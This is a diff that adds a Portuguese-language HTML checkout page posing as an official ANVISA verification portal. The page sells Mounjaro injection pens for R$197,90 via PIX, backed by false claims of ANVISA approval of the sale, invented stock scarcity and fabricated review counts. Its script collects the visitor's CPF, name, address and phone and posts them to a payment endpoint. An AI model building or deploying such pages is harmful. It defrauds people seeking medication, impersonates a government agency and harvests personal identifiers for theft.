@@ -1,0 +1,917 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Detalhes do Produto | ANVISA</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #f8f9fa;
+    }
+    
+    .main-title {
+      font-size: 24px;
+      font-weight: 700;
+      color: #1351b4;
+      margin-bottom: 8px;
+    }
+    
+    .subtitle {
+      font-size: 16px;
+      color: #666666;
+      margin-bottom: 24px;
+    }
+    
+    .sticky-header {
+      position: sticky;
+      top: 0;
+      background-color: white;
+      z-index: 50;
+      transition: box-shadow 0.3s ease;
+    }
+    
+    .sticky-header.shadow {
+      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+    }
+    
+    .secure-badge {
+      display: inline-flex;
+      align-items: center;
+      background-color: #f0f7ff;
+      color: #1351b4;
+      padding: 6px 12px;
+      border-radius: 16px;
+      font-size: 12px;
+      font-weight: 600;
+    }
+    
+    .secure-badge i {
+      margin-right: 4px;
+    }
+    
+    .product-container {
+      background-color: white;
+      border-radius: 12px;
+      box-shadow: 0 4px 6px rgba(0,0,0,0.05);
+      overflow: hidden;
+      max-width: 1000px;
+      margin: 0 auto;
+    }
+    
+    .product-header {
+      background-color: #f0f7ff;
+      padding: 20px;
+      border-bottom: 1px solid #e0e7ff;
+    }
+    
+    .product-content {
+      padding: 30px;
+    }
+    
+    .product-image {
+      border-radius: 8px;
+      overflow: hidden;
+      max-width: 100%;
+      height: auto;
+    }
+    
+    .product-info {
+      padding: 0 20px;
+    }
+    
+    .product-title {
+      font-size: 24px;
+      font-weight: 700;
+      color: #1351b4;
+      margin-bottom: 8px;
+    }
+    
+    .product-subtitle {
+      font-size: 16px;
+      color: #4b5563;
+      margin-bottom: 16px;
+    }
+    
+    .highlight-point {
+      display: flex;
+      align-items: center;
+      margin-bottom: 12px;
+    }
+    
+    .highlight-icon {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      width: 30px;
+      height: 30px;
+      border-radius: 50%;
+      background-color: #dcfce7;
+      color: #16a34a;
+      margin-right: 12px;
+      flex-shrink: 0;
+    }
+    
+    .highlight-text {
+      font-size: 15px;
+      color: #4b5563;
+    }
+    
+    .btn {
+      padding: 12px 20px;
+      border-radius: 6px;
+      font-weight: 600;
+      font-size: 16px;
+      transition: all 0.2s ease;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+    }
+    
+    .btn-primary {
+      background-color: #1351b4;
+      color: white;
+      border: none;
+    }
+    
+    .btn-primary:hover {
+      background-color: #0c3d8a;
+    }
+    
+    .btn i {
+      margin-right: 8px;
+    }
+    
+    .feature-card {
+      border-radius: 8px;
+      padding: 20px;
+      margin-bottom: 20px;
+      background-color: #f9fafb;
+      border: 1px solid #e5e7eb;
+    }
+    
+    .feature-card.diabetes {
+      border-left: 4px solid #8b5cf6;
+      background-color: #f5f3ff;
+    }
+    
+    .feature-card.weight {
+      border-left: 4px solid #3b82f6;
+      background-color: #eff6ff;
+    }
+    
+    .feature-title {
+      font-size: 16px;
+      font-weight: 600;
+      color: #1f2937;
+      margin-bottom: 8px;
+      display: flex;
+      align-items: center;
+    }
+    
+    .feature-title i {
+      margin-right: 8px;
+      color: #1351b4;
+    }
+    
+    .feature-card.diabetes .feature-title i {
+      color: #8b5cf6;
+    }
+    
+    .feature-card.weight .feature-title i {
+      color: #3b82f6;
+    }
+    
+    .feature-text {
+      font-size: 14px;
+      color: #4b5563;
+      line-height: 1.5;
+    }
+    
+    .benefit-divider {
+      height: 1px;
+      background-color: #e5e7eb;
+      margin: 24px 0;
+    }
+    
+    .benefit-title {
+      font-size: 18px;
+      font-weight: 600;
+      color: #1351b4;
+      margin-bottom: 16px;
+    }
+    
+    .delivery-address {
+      background-color: #f9fafb;
+      border-radius: 8px;
+      padding: 16px;
+      margin-bottom: 24px;
+      border: 1px solid #e5e7eb;
+    }
+    
+    .address-title {
+      font-size: 16px;
+      font-weight: 600;
+      color: #4b5563;
+      margin-bottom: 8px;
+      display: flex;
+      align-items: center;
+    }
+    
+    .address-title i {
+      margin-right: 8px;
+      color: #1351b4;
+    }
+    
+    .address-details {
+      font-size: 14px;
+      color: #6b7280;
+      margin-bottom: 8px;
+    }
+    
+    .address-details strong {
+      color: #4b5563;
+    }
+    
+    .address-change {
+      font-size: 14px;
+      color: #1351b4;
+      text-decoration: underline;
+      cursor: pointer;
+    }
+    
+    .vlibras-icon {
+      position: fixed;
+      right: 10px;
+      top: 50%;
+      transform: translateY(-50%);
+      z-index: 1000;
+    }
+    
+    .personalized-tag {
+      display: inline-flex;
+      align-items: center;
+      background-color: #fef3c7;
+      color: #b45a00;
+      padding: 4px 8px;
+      border-radius: 4px;
+      font-size: 12px;
+      font-weight: 600;
+      margin-bottom: 12px;
+    }
+    
+    .personalized-tag i {
+      margin-right: 4px;
+      font-size: 10px;
+    }
+    
+    /* Estilos para o alerta de estoque */
+    .stock-alert {
+      margin: 16px 0;
+      background-color: #fffbeb;
+      border: 1px solid #fef3c7;
+      border-radius: 8px;
+      padding: 16px;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+    }
+    
+    .stock-indicator {
+      display: flex;
+      flex-direction: column;
+      margin-bottom: 12px;
+    }
+    
+    .stock-bar {
+      height: 8px;
+      background-color: #e5e7eb;
+      border-radius: 4px;
+      margin-bottom: 8px;
+      overflow: hidden;
+      position: relative;
+    }
+    
+    .stock-fill {
+      position: absolute;
+      left: 0;
+      top: 0;
+      height: 100%;
+      width: 18.4%;
+      background: linear-gradient(90deg, #ef4444 0%, #f59e0b 100%);
+      border-radius: 4px;
+    }
+    
+    .stock-info {
+      display: flex;
+      justify-content: space-between;
+      font-size: 14px;
+    }
+    
+    .stock-text {
+      color: #1f2937;
+      font-weight: 500;
+    }
+    
+    .stock-count {
+      color: #ef4444;
+      font-weight: 700;
+    }
+    
+    .stock-percent {
+      color: #6b7280;
+      font-size: 12px;
+    }
+    
+    .stock-warning {
+      display: flex;
+      align-items: flex-start;
+      background-color: #fef2f2;
+      border-left: 4px solid #ef4444;
+      padding: 12px;
+      border-radius: 0 4px 4px 0;
+    }
+    
+    .stock-warning i {
+      color: #ef4444;
+      font-size: 20px;
+      margin-right: 12px;
+      flex-shrink: 0;
+      margin-top: 2px;
+    }
+    
+    .warning-title {
+      font-weight: 600;
+      color: #ef4444;
+      margin-bottom: 4px;
+      font-size: 16px;
+    }
+    
+    .warning-text {
+      color: #1f2937;
+      font-size: 14px;
+      line-height: 1.4;
+    }
+    
+    .benefits-list {
+      display: grid;
+      grid-template-columns: repeat(1, 1fr);
+      gap: 16px;
+      margin-bottom: 24px;
+    }
+    
+    @media (min-width: 768px) {
+      .benefits-list {
+        grid-template-columns: repeat(2, 1fr);
+      }
+    }
+    
+    .benefit-item {
+      background-color: #f9fafb;
+      border-radius: 8px;
+      padding: 16px;
+      border: 1px solid #e5e7eb;
+      display: flex;
+      flex-direction: column;
+    }
+    
+    .benefit-item-title {
+      font-size: 15px;
+      font-weight: 600;
+      color: #1f2937;
+      margin-bottom: 8px;
+      display: flex;
+      align-items: center;
+    }
+    
+    .benefit-item-title i {
+      margin-right: 8px;
+      color: #16a34a;
+    }
+    
+    .benefit-item-text {
+      font-size: 14px;
+      color: #6b7280;
+      flex-grow: 1;
+    }
+    
+    .product-review {
+      display: flex;
+      align-items: center;
+      margin-bottom: 12px;
+    }
+    
+    .stars {
+      display: flex;
+      margin-right: 8px;
+    }
+    
+    .star {
+      color: #facc15;
+      margin-right: 2px;
+    }
+    
+    .review-count {
+      font-size: 14px;
+      color: #6b7280;
+    }
+    
+    .product-price-container {
+      display: flex;
+      flex-direction: column;
+      align-items: flex-start;
+      margin-bottom: 16px;
+    }
+    
+    .product-original-price {
+      font-size: 14px;
+      color: #9ca3af;
+      text-decoration: line-through;
+    }
+    
+    .product-price {
+      font-size: 24px;
+      font-weight: 700;
+      color: #1351b4;
+    }
+    
+    .price-disclaimer {
+      font-size: 12px;
+      color: #6b7280;
+      margin-top: 4px;
+    }
+    
+    .included-items {
+      margin-top: 24px;
+      padding-top: 24px;
+      border-top: 1px solid #e5e7eb;
+    }
+    
+    .included-title {
+      font-size: 16px;
+      font-weight: 600;
+      color: #4b5563;
+      margin-bottom: 12px;
+    }
+    
+    .included-item {
+      display: flex;
+      align-items: center;
+      margin-bottom: 8px;
+    }
+    
+    .included-item i {
+      color: #16a34a;
+      margin-right: 8px;
+    }
+    
+    .included-text {
+      font-size: 14px;
+      color: #6b7280;
+    }
+  </style>
+</head>
+<body>
+  <img src="https://i.ibb.co/btmZWCB/IMG-3113.jpg" alt="Government header" class="w-screen">
+  <div class="sticky-header">
+    <div class="container mx-auto px-4 border-b border-[#0000001a]">
+      <div class="flex items-center justify-between py-2">
+        <div class="flex items-center">
+          <i class="fas fa-bars text-sm text-[#1451B4] mr-4 relative -top-1"></i>
+          <p class="text-[14px] text-[#333333] -ml-[5px] leading-tight">
+            Centro de Verificação Digital | ANVISA
+          </p>
+        </div>
+        <div class="flex items-center space-x-4">
+          <i class="fas fa-shield-alt text-sm text-green-600 relative -top-1"></i>
+          <i class="fas fa-lock text-sm text-green-600 relative -top-1"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+  
+  <div class="container mx-auto px-4">
+    <div class="py-4">
+      <div class="flex items-center space-x-2 text-[13px]">
+        <a class="text-[#1451B4]" href="#"><i class="fas fa-home text-sm text-[#1451B4]"></i></a>
+        <span class="text-[#9E9D9D]">&gt;</span>
+        <a class="text-[#1451B4]" href="#">Portal Cidadão</a>
+        <span class="text-[#9E9D9D]">&gt;</span>
+        <a class="text-[#1451B4]" href="#">Verificação de Acesso</a>
+        <span class="text-[#9E9D9D]">&gt;</span>
+        <span class="font-bold">Aquisição de Mounjaro</span>
+      </div>
+    </div>
+  </div>
+
+  <main class="max-w-5xl mx-auto px-4 py-6">
+    <div class="mb-6">
+      <h2 class="main-title">
+        Detalhes do Produto
+      </h2>
+      <p class="subtitle">
+        Revise as informações e confirme sua aquisição do Mounjaro
+      </p>
+    </div>
+    
+    <div class="flex flex-wrap justify-center gap-3 my-4">
+      <span class="secure-badge"><i class="fas fa-shield-alt"></i> Site Oficial</span>
+      <span class="secure-badge"><i class="fas fa-lock"></i> Conexão Segura</span>
+      <span class="secure-badge"><i class="fas fa-database"></i> Dados Protegidos</span>
+      <span class="secure-badge"><i class="fas fa-check-circle"></i> Aprovado pela ANVISA</span>
+    </div>
+    
+    <div class="product-container">
+      <div class="product-header">
+        <h3 class="text-lg font-semibold text-[#0c326f]">Mounjaro - Tirzepatida 5mg</h3>
+        <p class="text-sm text-gray-600">Fabricante: Eli Lilly</p>
+      </div>
+      
+      <div class="product-content">
+        <div class="flex flex-col md:flex-row">
+          <div class="md:w-1/3 mb-6 md:mb-0 flex justify-center">
+            <img src="https://i.ibb.co/Ppd881c/rnk-caneta-mounjaro-5.png" alt="Mounjaro" class="product-image">
+          </div>
+          
+          <div class="md:w-2/3 product-info">
+            <div class="personalized-tag">
+              <i class="fas fa-star-of-life"></i> Recomendação Personalizada
+            </div>
+            
+            <div class="stock-alert">
+              <div class="stock-indicator">
+                <div class="stock-bar">
+                  <div class="stock-fill"></div>
+                </div>
+                <div class="stock-info">
+                  <span class="stock-text">Apenas <span class="stock-count">184</span> unidades em estoque</span>
+                  <span class="stock-percent">18.4% disponível</span>
+                </div>
+              </div>
+              <div class="stock-warning">
+                <i class="fas fa-exclamation-triangle"></i>
+                <div>
+                  <p class="warning-title">Estoque limitado!</p>
+                  <p class="warning-text">A ANVISA liberou somente 1.000 canetas para venda e restam apenas 184 unidades. Caso não realize a compra agora, você pode ter que esperar até 3 meses até a próxima liberação de estoque.</p>
+                </div>
+              </div>
+            </div>
+            
+            <h2 class="product-title">Mounjaro (Tirzepatida)</h2>
+            <p class="product-subtitle">4 Canetas injetáveis de 5mg - Tratamento para 3 mêses</p>
+            
+            <div class="product-review">
+              <div class="stars">
+                <i class="fas fa-star star"></i>
+                <i class="fas fa-star star"></i>
+                <i class="fas fa-star star"></i>
+                <i class="fas fa-star star"></i>
+                <i class="fas fa-star-half-alt star"></i>
+              </div>
+              <span class="review-count">(4.8/5 - 3.427 avaliações)</span>
+            </div>
+            
+            <div class="product-price-container">
+              <span class="product-price">Por R$ 197,90</span>
+              <span class="price-disclaimer">Pagamento único - sem recorrência</span>
+            </div>
+            
+            <!-- Benefícios personalizados baseados nas respostas do questionário -->
+            <div id="personalizedFeatures">
+              <!-- Serão inseridos dinamicamente via JavaScript -->
+            </div>
+            
+            <div class="benefit-divider"></div>
+            
+            <h3 class="benefit-title">Principais Benefícios</h3>
+            
+            <div class="benefits-list">
+              <div class="benefit-item">
+                <h4 class="benefit-item-title">
+                  <i class="fas fa-syringe"></i> Aplicação Simplificada
+                </h4>
+                <p class="benefit-item-text">
+                  Caneta pronta para uso, com dose já ajustada, facilitando a aplicação semanal.
+                </p>
+              </div>
+              
+              <div class="benefit-item">
+                <h4 class="benefit-item-title">
+                  <i class="fas fa-flask"></i> Tecnologia Avançada
+                </h4>
+                <p class="benefit-item-text">
+                  Desenvolvido com a mais recente tecnologia em agonistas do receptor GLP-1 e GIP.
+                </p>
+              </div>
+              
+              <div class="benefit-item">
+                <h4 class="benefit-item-title">
+                  <i class="fas fa-heartbeat"></i> Eficácia Comprovada
+                </h4>
+                <p class="benefit-item-text">
+                  Resultados significativos demonstrados em estudos clínicos de longo prazo.
+                </p>
+              </div>
+              
+              <div class="benefit-item">
+                <h4 class="benefit-item-title">
+                  <i class="fas fa-clock"></i> Efeito Prolongado
+                </h4>
+                <p class="benefit-item-text">
+                  Ação contínua durante a semana, mantendo níveis estáveis do medicamento.
+                </p>
+              </div>
+            </div>
+            
+            <div class="included-items">
+              <h4 class="included-title">O que está incluído:</h4>
+              <div class="included-item">
+                <i class="fas fa-check-circle"></i>
+                <span class="included-text">4 canetas de Mounjaro (Tirzepatida) 5mg</span>
+              </div>
+              <div class="included-item">
+                <i class="fas fa-check-circle"></i>
+                <span class="included-text">Embalagem refrigerada para transporte seguro</span>
+              </div>
+              <div class="included-item">
+                <i class="fas fa-check-circle"></i>
+                <span class="included-text">Manual de instruções detalhado</span>
+              </div>
+              <div class="included-item">
+                <i class="fas fa-check-circle"></i>
+                <span class="included-text">Frete grátis para todo o Brasil</span>
+              </div>
+            </div>
+            
+            <div class="delivery-address mt-6" id="deliveryAddressContainer">
+              <h4 class="address-title">
+                <i class="fas fa-map-marker-alt"></i> Endereço de Entrega
+              </h4>
+              
+              <div id="addressDetails">
+                <!-- Inserido dinamicamente via JavaScript -->
+                <p class="address-details">Carregando informações de endereço...</p>
+              </div>
+              
+              <a href="/endereco" class="address-change">Alterar endereço</a>
+            </div>
+            
+            <div class="mt-6 flex flex-wrap gap-4">
+              <button id="confirmarAquisicao" class="btn btn-primary w-full sm:w-auto">
+                <i class="fas fa-shopping-cart"></i> Confirmar Aquisição
+              </button>
+              <a href="/endereco" class="btn bg-gray-100 text-gray-700 w-full sm:w-auto mt-3 sm:mt-0">
+                <i class="fas fa-arrow-left"></i> Voltar
+              </a>
+            </div>
+            
+            <!-- Modal de Processamento -->
+            <div id="processingModal" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 hidden">
+              <div class="bg-white rounded-lg p-6 max-w-md w-full">
+                <div class="text-center">
+                  <div class="inline-block w-12 h-12 border-4 border-t-blue-500 border-blue-200 rounded-full animate-spin mb-4"></div>
+                  <h3 class="text-lg font-semibold text-gray-900 mb-2">Processando Pagamento</h3>
+                  <p class="text-gray-600">Estamos preparando seu pagamento. Por favor, aguarde...</p>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+    
+    <div class="bg-white p-4 rounded-lg shadow-sm mt-6">
+      <p class="font-bold text-gray-700 text-base mb-2">
+        <i class="fas fa-shield-alt text-green-600 mr-2"></i>
+        Segurança e Qualidade
+      </p>
+      <p class="text-gray-700 text-sm">
+        O Mounjaro é um medicamento aprovado pela ANVISA (Agência Nacional de Vigilância Sanitária) e está em conformidade com todas as regulamentações de saúde do Brasil.
+      </p>
+    </div>
+  </main>
+  
+  <div class="w-full mt-6">
+    <img src="https://i.ibb.co/DHjL5PHX/IMG-3117.jpg" alt="Imagem de rodapé do site" class="w-full">
+  </div>
+  
+  <a href="#" class="vlibras-icon">
+    <img src="https://cdn.jsdelivr.net/gh/spbgovbr-vlibras/vlibras-portal@dev/app/assets/access_icon.svg" alt="Ícone de acessibilidade em Libras" class="w-10 h-10">
+  </a>
+  
+  <script>
+    // Carregar dados do endereço do localStorage
+    function loadAddressData() {
+      const addressDataStr = localStorage.getItem('addressData');
+      if (!addressDataStr) {
+        window.location.href = '/endereco';
+        return;
+      }
+      
+      const addressData = JSON.parse(addressDataStr);
+      
+      // Preencher o contêiner de endereço
+      const addressDetails = document.getElementById('addressDetails');
+      
+      addressDetails.innerHTML = `
+        <p class="address-details">
+          <strong>${addressData.street}${addressData.number ? ', ' + addressData.number : ''}</strong>
+          ${addressData.complement ? addressData.complement : ''}
+        </p>
+        <p class="address-details">
+          ${addressData.neighborhood} - ${addressData.city}/${addressData.state}
+        </p>
+        <p class="address-details">
+          CEP: ${addressData.cep}
+        </p>
+        <p class="address-details">
+          Telefone: ${addressData.phone}
+        </p>
+      `;
+    }
+    
+    // Carregar dados do questionário do localStorage para personalização
+    function loadQuestionnaireData() {
+      const questionnaireDataStr = localStorage.getItem('questionnaireData');
+      if (!questionnaireDataStr) return;
+      
+      const questionnaireData = JSON.parse(questionnaireDataStr);
+      
+      // Contêiner para os recursos personalizados
+      const featuresContainer = document.getElementById('personalizedFeatures');
+      
+      // Verificar se o usuário tem diabetes como motivo 
+      if (questionnaireData.motivoInteresse && 
+          (questionnaireData.motivoInteresse.includes('diabetes') || 
+           (Array.isArray(questionnaireData.motivoInteresse) && 
+            questionnaireData.motivoInteresse.indexOf('diabetes') !== -1))) {
+        
+        const diabetesFeature = document.createElement('div');
+        diabetesFeature.className = 'feature-card diabetes';
+        diabetesFeature.innerHTML = `
+          <h4 class="feature-title">
+            <i class="fas fa-heartbeat"></i> Tratamento para Diabetes
+          </h4>
+          <p class="feature-text">
+            O Mounjaro (tirzepatida) mostrou resultados significativos no controle da glicemia em pacientes com diabetes tipo 2, melhorando a sensibilidade à insulina e reduzindo os níveis de HbA1c. Estudos clínicos demonstraram uma redução média de 2,1% nos níveis de HbA1c.
+          </p>
+        `;
+        
+        featuresContainer.appendChild(diabetesFeature);
+      }
+      
+      // Verificar se o usuário tem controle de peso como motivo
+      if (questionnaireData.motivoInteresse && 
+          (questionnaireData.motivoInteresse.includes('peso') || 
+           (Array.isArray(questionnaireData.motivoInteresse) && 
+            questionnaireData.motivoInteresse.indexOf('peso') !== -1))) {
+        
+        const weightFeature = document.createElement('div');
+        weightFeature.className = 'feature-card weight';
+        weightFeature.innerHTML = `
+          <h4 class="feature-title">
+            <i class="fas fa-weight"></i> Controle de Peso
+          </h4>
+          <p class="feature-text">
+            O Mounjaro oferece uma abordagem eficaz para o gerenciamento de peso, ajudando na redução do apetite e na sensação de saciedade por mais tempo. Em estudos clínicos, pacientes perderam em média 15% do peso corporal após 72 semanas de tratamento, superando outros medicamentos da mesma categoria.
+          </p>
+        `;
+        
+        featuresContainer.appendChild(weightFeature);
+      }
+      
+      // Se nenhum benefício personalizado for adicionado
+      if (featuresContainer.children.length === 0) {
+        const generalFeature = document.createElement('div');
+        generalFeature.className = 'feature-card';
+        generalFeature.innerHTML = `
+          <h4 class="feature-title">
+            <i class="fas fa-star"></i> Medicamento Multifuncional
+          </h4>
+          <p class="feature-text">
+            O Mounjaro (tirzepatida) é um medicamento inovador que atua em múltiplos mecanismos metabólicos, oferecendo benefícios para controle glicêmico e gerenciamento de peso em um único tratamento semanal. Sua fórmula exclusiva promove melhoria significativa na qualidade de vida.
+          </p>
+        `;
+        
+        featuresContainer.appendChild(generalFeature);
+      }
+    }
+    
+    // Processar pagamento
+    function processarPagamento() {
+      // Mostrar modal de processamento
+      document.getElementById('processingModal').classList.remove('hidden');
+      
+      // Obter dados do endereço
+      const addressDataStr = localStorage.getItem('addressData');
+      if (!addressDataStr) {
+        alert('Dados de endereço não encontrados. Por favor, preencha seu endereço.');
+        window.location.href = '/endereco';
+        return;
+      }
+      
+      const addressData = JSON.parse(addressDataStr);
+      
+      // Obter CPF e nome do fluxo de validação
+      const cpfValidado = localStorage.getItem('cpfValidado') || '';
+      const nomeCompleto = localStorage.getItem('nomeCompleto') || '';
+      
+      // Limpar o CPF para ter apenas números
+      let cpf = cpfValidado.replace(/\D/g, '');
+      
+      // Gerar email com base no CPF se não existir
+      let email = '';
+      if (cpf) {
+        email = `${cpf}@gmail.com`;
+      }
+      
+      // Nome completo do usuário
+      const nome = nomeCompleto || 'Cliente Anvisa';
+      
+      // Preparar dados para a requisição
+      const paymentData = {
+        name: nome,
+        cpf: cpf,
+        phone: addressData.phone || '',
+        email: email,
+        amount: 197.90,  // Valor fixo do Mounjaro
+        product: 'Mounjaro (Tirzepatida) 2,5mg - 4 Canetas',
+        address: {
+          street: addressData.street,
+          number: addressData.number || 'S/N',
+          complement: addressData.complement || '',
+          neighborhood: addressData.neighborhood,
+          city: addressData.city,
+          state: addressData.state,
+          zipcode: addressData.cep
+        }
+      };
+      
+      // Enviar requisição para o servidor
+      fetch('/processar_pagamento_mounjaro', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(paymentData)
+      })
+      .then(response => {
+        if (!response.ok) {
+          throw new Error('Erro ao processar pagamento');
+        }
+        return response.json();
+      })
+      .then(data => {
+        // Esconder modal de processamento
+        document.getElementById('processingModal').classList.add('hidden');
+        
+        if (data.success) {
+          // Armazenar dados do PIX no localStorage para reduzir o tamanho da URL
+          localStorage.setItem('pix_data', JSON.stringify({
+            transaction_id: data.transaction_id,
+            pix_code: data.pix_code,
+            pix_qrcode: data.pix_qrcode,
+            amount: data.amount
+          }));
+          
+          // Redirecionar para a página de pagamento PIX com apenas o ID da transação
+          window.location.href = '/pagamento_pix';
+        } else {
+          alert('Erro ao processar pagamento: ' + (data.message || 'Erro desconhecido'));
+        }
+      })
+      .catch(error => {
+        // Esconder modal de processamento
+        document.getElementById('processingModal').classList.add('hidden');
+        
+        // Mostrar erro
+        console.error('Erro:', error);
+        alert('Erro ao processar pagamento. Por favor, tente novamente.');
+      });
+    }
+    
+    // Funções a serem executadas quando a página carregar
+    window.onload = function() {
+      // Carregar dados do endereço
+      loadAddressData();
+      
+      // Carregar dados do questionário para personalização
+      loadQuestionnaireData();
+      
+      // Adicionar evento de clique ao botão de confirmar aquisição
+      document.getElementById('confirmarAquisicao').addEventListener('click', processarPagamento);
+    };
+    
+    // Efeito de scroll na barra de navegação
+    window.addEventListener('scroll', function() {
+      var header = document.querySelector('.sticky-header');
+      if (window.pageYOffset > 0) {
+        header.classList.add('shadow');
+      } else {
+        header.classList.remove('shadow');
+      }
+    });
+  </script>
+</body>
+</html>
